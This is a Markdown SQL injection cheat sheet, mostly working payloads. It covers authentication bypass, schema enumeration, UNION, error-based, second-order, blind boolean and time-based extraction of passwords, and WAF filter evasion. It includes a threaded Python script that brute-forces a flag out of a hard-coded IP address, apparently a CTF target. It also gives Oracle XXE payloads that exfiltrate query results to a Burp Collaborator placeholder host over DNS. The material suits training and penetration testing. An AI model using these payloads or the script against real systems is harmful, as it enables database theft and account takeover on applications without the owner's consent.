# 🔢 Basics
### Impact
- Dumping database
- System file read
- RCE (if the database engine is vulnerable)
### Detection
Find any input field that’s going to resolve something from the database
and try the following:
- add `'` or `"` → Error
- `or 1=1` → different output
### Basic Authentication Bypass
```sql
select username,password from users where username='username' and password='pass';
```
- **Payload**
    - username=`admin' or 1=1--`
    - password=`anything`
Result:
```sql
select username,password from users where username='admin' or 1=1--' and password='pass';
```

### `information_schema`
Information schema has many use tables but the most important are:
#### Tables

```sql
select TABLE_SCHEMA,TABLE_NAME from information_schema.tables limit 10;
+--------------------+---------------------------------------+
| TABLE_SCHEMA       | TABLE_NAME                            |
+--------------------+---------------------------------------+
| information_schema | ALL_PLUGINS                           |
| information_schema | APPLICABLE_ROLES                      |
| information_schema | CHARACTER_SETS                        |
| information_schema | CHECK_CONSTRAINTS                     |
| information_schema | COLLATIONS                            |
| information_schema | COLLATION_CHARACTER_SET_APPLICABILITY |
| information_schema | COLUMNS                               |
| information_schema | COLUMN_PRIVILEGES                     |
| information_schema | ENABLED_ROLES                         |
| information_schema | ENGINES                               |
+--------------------+---------------------------------------+

-- THERE ARE MORE COLUMNS, BUT WE DON'T CARE
```

All tables in our database:

```sql
select TABLE_NAME from information_schema.tables where TABLE_SCHEMA=database() limit 0,1;
```

#### Columns

```sql
select TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME from information_schema.columns limit 10;
+--------------------+-------------+------------------------+
| TABLE_SCHEMA       | TABLE_NAME  | COLUMN_NAME            |
+--------------------+-------------+------------------------+
| information_schema | ALL_PLUGINS | PLUGIN_NAME            |
| information_schema | ALL_PLUGINS | PLUGIN_VERSION         |
| information_schema | ALL_PLUGINS | PLUGIN_STATUS          |
| information_schema | ALL_PLUGINS | PLUGIN_TYPE            |
| information_schema | ALL_PLUGINS | PLUGIN_TYPE_VERSION    |
| information_schema | ALL_PLUGINS | PLUGIN_LIBRARY         |
| information_schema | ALL_PLUGINS | PLUGIN_LIBRARY_VERSION |
| information_schema | ALL_PLUGINS | PLUGIN_AUTHOR          |
| information_schema | ALL_PLUGINS | PLUGIN_DESCRIPTION     |
| information_schema | ALL_PLUGINS | PLUGIN_LICENSE         |
+--------------------+-------------+------------------------+

-- THERE ARE MORE COLUMNS, BUT WE DON'T CARE
```

All columns in table(`user`):
```sql
select COLUMN_NAME from information_schema.columns where TABLE_SCHEMA=database() and TABLE_NAME='user' limit 0l;
```

### `sql_master`
#### Tables
```sql
-- Tables
SELECT name FROM sqlite_master WHERE type = 'table';
SELECT name FROM pragma_table_list();
```
#### Columns
```sql
-- SQL Query that created the table (expose cols)
SELECT sql FROM sqlite_master WHERE type='table' AND name='your_table';
SELECT * FROM table_name;
```

---
# 👁️‍🗨️ In-Band SQLi

## UNION-based SQLi

> [!Warning] UNION cannot be used if the application doesn’t return any data.

**UNION** is a feature that enables combining the result of multiple queries together
Like So:
```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

The above query will execute both queries and returns the result of both combined in one table.
##### Requirements
- Same Number of Columns
- `a.type == c.type && b.type == d.type`
### Determine Number of Columns in Query
#### Inject `order by`
Inject `a' order by n` and increment `n` until having an error
```sql
'a' order by 1-- VALID
'a' order by 2-- VALID
'a' order by 3-- ERROR, then cols are 2
```
#### Inject `null`
Inject `a' select null` and add more `null` till error disappears
```sql
'a' UNION SELECT NULL--
'a' UNION SELECT NULL,NULL--
'a' UNION SELECT NULL,NULL,NULL--
-- etc.
```

### Concatenate Multiple Columns in One Column
If we have only one column that is `str`
We can concatenate columns in one column
```sql
'' UNION select username || '~' || password from users--
```

### Concatenate Entire Column in a Single Row
what if we receive only one row back?
```sql
'' UNION select group_concat(password) from users--
```

> [!Tip] 
> `group_concat()` concatenates entire column in a single string separated by comma.

## Error-based
Intentionally, making errors that force the application to sprit out useful data
```sql
-- MS SQL SERVER
OR CAST((select password from users), bool)-- -
OR 1=CONVERT(int, (SELECT @@version))-- -
-- MySQL - concat with ~ to make it invalid xpath
AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT username FROM users LIMIT 1)))-- -
```

## Second Order
Second-order SQL injection, also known as stored SQL injection, exploits vulnerabilities where user-supplied input is saved and subsequently used in a different part of the application, possibly after some initial processing.

**How It Works**
1. Insert query looks like:
	```sql
	INSERT INTO users (username, email) VALUES ('username','email');
	```
2. Put this payload in any of the fields:
	```
	'||(select password from users where username='admin')||'
	```
3. SQL query becomes like:
	```sql
	INSERT INTO users (username, email) VALUES (''||(select password from users where username='admin')||'','email');
	```
4. Viewing our profile and getting admin password in our username field 😎

---
# 👀 Blind SQLi

## Boolean Based
### Conditional Response

> [!Tip] Usually used in login pages

Page returns:
- Welcome → condition is **true**
- Otherwise → condition is **false**

```sql
-- MySQL
or substring((select password from users where username='administrator'),1,1)='a'--
-- SQLite
or substr((select password from users where username='administrator'),1,1)='a'--
-- Works bad with Wildcard Characters
or (select password from users where username='administrator') LIKE 'a%'--
```

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from time import sleep
import threading

URL = "http://104.198.24.52:6013/search"

# Rate limiting: max 30 requests per second
MAX_RPS = 30
REQUESTS_MADE = 0
LOCK = threading.Lock()
CHARSET = ''.join(chr(i) for i in range(32, 127))
OUTPUT = ""

payload_template = "0 or substr((SELECT flag FROM secret_flags limit 1),{pos},1)='{char}'"

def make_request(pos, char):
    global REQUESTS_MADE
    payload = payload_template.format(pos=pos, char=char)
    params = {"id": payload}

    with LOCK:
        REQUESTS_MADE += 1
        if REQUESTS_MADE % MAX_RPS == 0:
            sleep(1)
    
    try:
        r = requests.get(URL, params=params, timeout=10)
        return char, "User found!" in r.text
    except:
        return char, False

def brute_force_position(pos):
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = {executor.submit(make_request, pos, char): char for char in CHARSET}
        
        for future in as_completed(futures):
            char, success = future.result()
            if success:
                return char
    return None

while True:
    found_char = brute_force_position(len(OUTPUT)+1)
    if found_char is None:
        print("[!] No more characters found. Likely end of string.")
        break
    OUTPUT += found_char
    print(f"[*] Current output: {OUTPUT}")

print(f"\n[+] Final extracted value: {OUTPUT}")
```

### Conditional Error
Response:
- `Error` → condition is true
- `200 OK` → condition is false

```sql
-- Oracel
' || (SELECT CASE WHEN (substring(password,1,1)='a') THEN to_char(1/0) ELSE 'b' END from users where username='admin') || '

union select (1/0),null from users where username='admin' and password like 'a%';--
```

## Time Delay
Response delays for:
- `> 2` → condition is **true**
- `else` → condition is **false**

> [!Warning] Only Works If Synchronous

```sql
'||(select case when (substring(password,{pos},1)='{char}') then (sleep(2)) else 'a' end from users where username='admin')||'

union select sleep(2),null from users where username='admin' and password like 'a%';--
```

---
# 😎 Out-Of-Band SQLi
Making the website exfiltrate database and send us the result to our server (e.g DNS)
#### Using DNS    
To Test It
```sql
-- Oracle
'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "<http://BURP-COLLABORATOR-SUBDOMAIN/>"> %remote;]>'),'/l') FROM TABLE_IN_DATABASE)||'
```   
To Extract Data (just use concatenation)

> [!Warning] You query should return exact one value

```sql
-- Oracle
'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(YOUR_QUERY)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM TABLE_IN_DATABASE)||'
```

---
# 🧱 WAF Bypass

## Condition Filtering

```sql
-- false = false => true
username='ad'=1=0--
username='ad'IS'1'IS NOT'1'--

-- false === 0
username='ad'=0--
username='ad'IS 0--
```
